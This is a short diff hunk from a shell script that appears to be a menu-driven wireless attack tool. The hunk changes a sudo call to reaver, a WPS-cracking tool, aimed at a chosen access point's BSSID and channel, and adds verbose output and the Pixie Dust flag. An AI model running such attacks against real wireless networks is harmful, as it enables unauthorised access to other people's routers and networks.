@@ -261,6 +261,6 @@ if [ $ask -eq 6 ]
 		read chan
 		echo "loading attack..."
 		tput setaf 1
-		sudo reaver -i $monitor -c $chan -b $macacc -k 1
+		sudo reaver -i $monitor -b $macacc -c $chan -vvv -K 1 -f
 		echo "done"
 fi
